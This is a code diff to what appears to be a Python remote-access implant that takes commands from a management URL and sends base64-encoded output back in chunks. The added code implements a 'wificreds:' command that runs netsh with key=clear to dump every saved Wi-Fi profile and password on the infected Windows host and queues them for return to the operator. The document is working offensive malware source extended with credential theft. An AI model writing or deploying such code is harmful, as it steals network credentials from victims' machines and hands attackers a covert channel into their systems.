@@ -120,6 +120,8 @@ def connect(url,managementURL):
             if cmd.startswith("download:"):
                 decodelist.append(cmd)
 
+            if cmd.startswith("wificreds:"):
+                decodelist.append(cmd)
 
             #Changes implant sleeptime
             if cmd.startswith("stime:"):
@@ -174,16 +176,36 @@ def connect(url,managementURL):
 
     try:
         #print ("[+] Command: " + command)
-
         if command.startswith("fallback:"):
             global canaryManagementURL
             canaryManagementURL = cmd.replace("fallback:", "")
             #print("[+] Fallback Canarytoken Detected: ")
             main()
 
+        elif command.startswith("wificreds:"):
+            # Wifi credentials implementation in python https://nitratine.net/blog/post/get-wifi-passwords-with-python/
+            stringBuilder = ""
+            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
+            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+            for i in profiles:
+                try:
+                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
+                        'utf-8',
+                        errors="backslashreplace").split(
+                        '\n')
+                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+                    try:
+                        stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, results[0]) + "\n")
+                    except IndexError:
+                        stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, "") + "\n")
+                except subprocess.CalledProcessError:
+                    stringBuilder = stringBuilder + ("{:<30}|  {:<}".format(i, "<ENCODING ERROR>") + "\n")
+            stringBuilder="res:"+stringBuilder
+            b64 = base64.b64encode(stringBuilder.encode('UTF-8'))
+
 
         # Adds command to #print working dir
-        if command.startswith("task:pwdtask:"):
+        elif command.startswith("task:pwdtask:"):
             command = command.replace("task:pwdtask:", "")
             #hacky way to change directory since `cd <dir>` doesn't work with the subprocess module
             if "cd " in command:
@@ -275,7 +297,6 @@ def connect(url,managementURL):
         #print("[+] Data too long, splitting into multiple requests")
         split = [b64[i:i + 7000] for i in range(0, len(b64), 7000)]
         length = len(split)
-
 
         # If data will be sent in over 50 chunks, send warning that output cant be sent
         if len(split) >= 50:
